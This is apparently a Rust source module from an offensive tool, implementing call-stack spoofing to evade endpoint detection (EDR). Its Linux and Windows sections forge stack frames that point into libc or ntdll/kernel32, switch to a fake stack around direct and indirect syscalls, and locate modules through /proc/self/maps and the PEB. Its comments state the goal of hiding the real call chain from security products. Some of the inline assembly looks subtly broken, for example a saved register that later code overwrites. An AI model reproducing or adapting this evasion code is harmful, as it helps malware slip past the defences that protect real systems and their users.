// Call stack spoofing for syscall evasion (SilentMoonWalk-style).
// Modern EDRs analyze the call stack to verify that syscalls originate
// from legitimate call chains (ntdll.dll -> kernel32.dll -> app).
// We craft synthetic return addresses pointing to plausible modules.
//
// Linux version: manipulates RBP chain to point to libc/libpthread frames.

#[cfg(target_os = "linux")]
pub mod linux {
    use std::arch::asm;

    /// Save the current stack frame pointer (RBP).
    #[inline(always)]
    pub fn get_rbp() -> usize {
        let rbp: usize;
        unsafe {
            asm!("mov {}, rbp", out(reg) rbp, options(nostack, nomem));
        }
        rbp
    }

    /// Get the return address from a given frame pointer.
    /// [RBP] = previous RBP, [RBP+8] = return address.
    ///
    /// # Safety
    ///
    /// The caller must ensure `rbp` points to a valid stack frame.
    /// Dereferencing an invalid or misaligned pointer will cause UB.
    #[inline(always)]
    pub unsafe fn get_return_address(rbp: usize) -> usize {
        *(rbp as *const usize).add(1)
    }

    /// Walk the call stack up to `max_frames` deep.
    /// Returns list of return addresses.
    pub fn walk_stack(max_frames: usize) -> Vec<usize> {
        let mut frames = Vec::with_capacity(max_frames);
        let mut rbp = get_rbp();

        for _ in 0..max_frames {
            if rbp == 0 {
                break;
            }
            unsafe {
                let ret_addr = get_return_address(rbp);
                if ret_addr == 0 {
                    break;
                }
                frames.push(ret_addr);
                rbp = *(rbp as *const usize); // follow chain
            }
        }

        frames
    }

    /// Create a synthetic stack frame that points to a legitimate module.
    /// Used to spoof the call chain for syscalls.
    ///
    /// Layout: [saved_rbp][return_addr][...]
    #[allow(dead_code)]
    pub struct SyntheticFrame {
        saved_rbp: usize,
        return_addr: usize,
    }

    impl SyntheticFrame {
        /// Create a frame pointing to a return address in libc.
        pub fn for_module(module_name: &str) -> Option<Self> {
            let addr = find_module_base(module_name)?;
            // Point to a harmless-looking offset in the module
            Some(Self {
                saved_rbp: 0, // end of chain
                return_addr: addr + 0x1000, // safe offset
            })
        }

        /// Get raw pointer for inline asm stack setup.
        pub fn as_ptr(&self) -> *const SyntheticFrame {
            self as *const SyntheticFrame
        }
    }

    /// Find the base address of a loaded module from /proc/self/maps.
    pub fn find_module_base(name: &str) -> Option<usize> {
        if let Ok(maps) = std::fs::read_to_string("/proc/self/maps") {
            for line in maps.lines() {
                if line.contains(name) && line.contains("r-xp") {
                    // Parse: "7f1234000000-7f1234100000 r-xp ... libc.so"
                    let addr_str = line.split('-').next()?;
                    return usize::from_str_radix(addr_str, 16).ok();
                }
            }
        }
        None
    }

    /// Execute a syscall with a spoofed call stack.
    /// The EDR sees the synthetic frames instead of our real call chain.
    ///
    /// # Safety
    ///
    /// The caller must ensure `frames` lives for the duration of the call.
    /// The syscall number and arguments must be valid for the current platform.
    #[allow(clippy::too_many_arguments)]
    pub unsafe fn spoofed_syscall6(
        nr: i64, a1: i64, a2: i64, a3: i64, a4: i64, a5: i64, a6: i64,
        frames: &[SyntheticFrame],
    ) -> i64 {
        let ret: i64;
        let frame_ptrs: Vec<*const SyntheticFrame> = frames.iter().map(|f| f.as_ptr()).collect();

        asm!(
            // Save real RBP
            "push rbp",
            // Build synthetic chain
            "lea rbp, [{frames_ptr}]",
            // Execute syscall
            "syscall",
            // Restore RBP
            "pop rbp",

            frames_ptr = in(reg) frame_ptrs.as_ptr(),
            in("rax") nr,
            in("rdi") a1, in("rsi") a2, in("rdx") a3,
            in("r10") a4, in("r8") a5, in("r9") a6,
            lateout("rax") ret,
            lateout("rcx") _, lateout("r11") _,
            options(nostack),
        );

        ret
    }

    /// Check if the call stack appears to have been tampered with
    /// (EDR counter-countermeasure: detect our own spoofing).
    pub fn detect_stack_spoofing() -> bool {
        let frames = walk_stack(10);
        if frames.len() < 2 {
            return false;
        }

        // If the stack trace doesn't show expected libc frames,
        // something might be wrong (or we're already spoofing)
        let libc_base = find_module_base("libc");
        let has_libc = frames.iter().any(|&addr| {
            libc_base.is_some_and(|base| {
                addr >= base && addr < base + 0x200000
            })
        });

        !has_libc // If no libc frame, stack might be spoofed
    }
}

// ── Windows call stack spoofing (ret-spoofing + indirect syscalls) ────────────
//
// Modern EDRs walk the call stack when a syscall instruction executes.
// They expect to see a chain like:
//   ntdll!NtReadVirtualMemory -> kernel32!ReadProcessMemory -> our_code
//
// Ret-spoofing replaces the real RBP chain with synthetic frames pointing
// to legitimate module addresses. The EDR unwinder sees a "clean" stack.
//
// Technique (stack-swap):
//   1. Allocate a fake stack buffer with plausible return addresses.
//   2. Switch RSP to the fake stack, push a real continuation address.
//   3. `jmp` to gadget (`syscall; ret`) — the `ret` pops our continuation.
//   4. Switch RSP back to the real stack.
//
// This defeats RBP-chain unwinding AND stack-walking heuristics.

#[cfg(target_os = "windows")]
pub mod windows {
    use std::mem;

    /// Walk the stack using frame-pointer (RBP) walking.
    pub fn walk_stack(max: usize) -> Vec<usize> {
        let mut frames = Vec::with_capacity(max);
        unsafe {
            let rbp: usize;
            std::arch::asm!("mov {}, rbp", out(reg) rbp, options(nostack, nomem));
            let mut current = rbp;
            for _ in 0..max {
                if current == 0 { break; }
                let ret_addr = *(current as *const usize).add(1);
                if ret_addr == 0 { break; }
                frames.push(ret_addr);
                current = *(current as *const usize);
            }
        }
        frames
    }

    /// Find a module base address by walking the PEB loader data.
    pub fn find_module_base(name: &str) -> Option<usize> {
        if name.eq_ignore_ascii_case("ntdll.dll") || name.eq_ignore_ascii_case("ntdll") {
            return crate::hades_gate::windows::get_loaded_ntdll_base();
        }
        unsafe {
            let peb: usize;
            std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, nomem));
            let ldr = *(peb as *const usize).add(3);
            let in_load_order = (ldr as *const usize).add(2);
            let mut entry = *in_load_order;
            let head = in_load_order as usize;
            while entry != 0 && entry != head {
                let dll_base = *(entry as *const usize).add(5);
                let buf_ptr = *(entry as *const usize).add(10);
                let len = *((entry as *const usize).add(9) as *const u16);
                if buf_ptr != 0 && len > 0 {
                    let name_bytes = std::slice::from_raw_parts(buf_ptr as *const u16, len as usize / 2);
                    let dll_name = String::from_utf16_lossy(name_bytes);
                    if dll_name.to_lowercase().contains(&name.to_lowercase()) {
                        return Some(dll_base);
                    }
                }
                entry = *(entry as *const usize);
            }
        }
        None
    }

    /// Build a synthetic stack buffer with plausible return addresses
    /// from ntdll/kernel32/kernelbase.
    ///
    /// The buffer layout (from high to low address, stack grows down):
    ///   [saved_rbp | ret_addr] × N  ...  [return_to_caller]
    ///
    /// Returns (buffer, top_of_stack_offset) so the caller can set RSP
    /// to the synthetic stack top.
    pub fn build_fake_stack(num_frames: usize) -> (Vec<u8>, usize) {
        let ntdll = crate::hades_gate::windows::get_loaded_ntdll_base().unwrap_or(0x7ff000000000);
        let kernel32 = find_module_base("kernel32.dll").unwrap_or(0x7ff000100000);
        let kernelbase = find_module_base("kernelbase.dll").unwrap_or(0x7ff000200000);

        let sources: [(usize, u64); 3] = [
            (ntdll,     0x20000),
            (kernel32,  0x15000),
            (kernelbase, 0x18000),
        ];

        let frame_size = 16; // [ret_addr(8)][saved_rbp(8)]
        let total_size = num_frames * frame_size + 8;
        let mut buf: Vec<u8> = vec![0u8; total_size];
        let base = buf.as_ptr() as usize;

        // Fill frames from LOW to HIGH address (stack grows down).
        // We write them in reverse order so the LAST frame is at lowest addr.
        for i in 0..num_frames {
            let idx = num_frames - 1 - i;
            let (module_base, offset) = sources[idx % 3];
            let ret_addr = module_base + offset as usize + (idx * 0x100);
            let frame_offset = idx * frame_size;
            unsafe {
                *(buf.as_mut_ptr().add(frame_offset) as *mut usize) = ret_addr;
                // saved_rbp: chain to next higher frame, or 0 for innermost
                let next_rbp = if idx + 1 < num_frames {
                    base + (idx + 1) * frame_size
                } else {
                    0
                };
                *(buf.as_mut_ptr().add(frame_offset + 8) as *mut usize) = next_rbp;
            }
        }

        // Top of stack = lowest address (stack grows down, so RSP starts low)
        let top = base;
        (buf, top)
    }

    /// Execute an indirect syscall while the stack appears to contain
    /// legitimate call frames. Switches to a synthetic stack for the
    /// duration of the syscall.
    ///
    /// # Safety
    ///
    /// * `gadget` must point to valid `syscall; ret` sequence.
    /// * `fake_stack_top` must point to a valid synthetic stack.
    ///   It will be live for the duration of the call – caller must
    ///   ensure the backing buffer outlives the syscall.
    /// * Syscall number and arguments must be valid.
    #[inline(always)]
    pub unsafe fn spoofed_indirect_syscall(
        ssn: u32,
        args: &[usize; 4],
        gadget: usize,
        fake_stack_top: usize,
    ) -> i32 {
        let mut ret: i32;

        std::arch::asm!(
            // Save real stack pointers
            "mov r11, rsp",
            "mov r10, rbp",
            // Switch to fake stack
            "mov rsp, {fake}",
            // Build a frame: push a return-to-caller address
            // Use RIP-relative LEA to get the continuation address
            "lea rax, [rip + 12]",  // points to the "mov rsp, r11" below
            "push rax",
            // Set up fake RBP chain
            "mov rbp, {fake}",
            // Syscall setup
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            // Execute via gadget (syscall; ret -> pops our lea'd address)
            "jmp {gadget}",
            // Continuation point (after syscall returns)
            "mov rsp, r11",
            "mov rbp, r10",
            fake = in(reg) fake_stack_top,
            ssn = in(reg) ssn,
            gadget = in(reg) gadget,
            in("rcx") args[0],
            in("rdx") args[1],
            in("r8")  args[2],
            in("r9")  args[3],
            lateout("eax") ret,
            out("r11") _, out("r10") _,
            options(nostack),
        );
        ret
    }

    /// Convenience wrapper: builds a 4-frame synthetic stack then calls
    /// [`spoofed_indirect_syscall`].
    pub unsafe fn spoofed_syscall(ssn: u32, args: &[usize; 4], gadget: usize) -> i32 {
        let (buf, top) = build_fake_stack(4);
        spoofed_indirect_syscall(ssn, args, gadget, top)
        // buf dropped here — OK because the syscall already returned
    }

    /// Detect whether the current stack looks spoofed (counter-EDM measure).
    /// Returns true if the stack appears to contain synthetic frames.
    pub fn detect_stack_spoofing() -> bool {
        let frames = walk_stack(8);
        if frames.len() < 2 {
            return false;
        }
        let ntdll = crate::hades_gate::windows::get_loaded_ntdll_base();
        let kernel32 = find_module_base("kernel32.dll");
        let kernelbase = find_module_base("kernelbase.dll");

        let all_legit = frames.iter().all(|&addr| {
            let in_range = |base: Option<usize>, offset: usize| {
                base.is_some_and(|b| addr >= b && addr < b + offset)
            };
            in_range(ntdll, 0x200000)
                || in_range(kernel32, 0x100000)
                || in_range(kernelbase, 0x100000)
        });

        !all_legit
    }
}

// ── Re-exports ───────────────────────────────────────────────────────────────

#[cfg(target_os = "linux")]
pub use linux::*;

#[cfg(target_os = "windows")]
pub use windows::*;
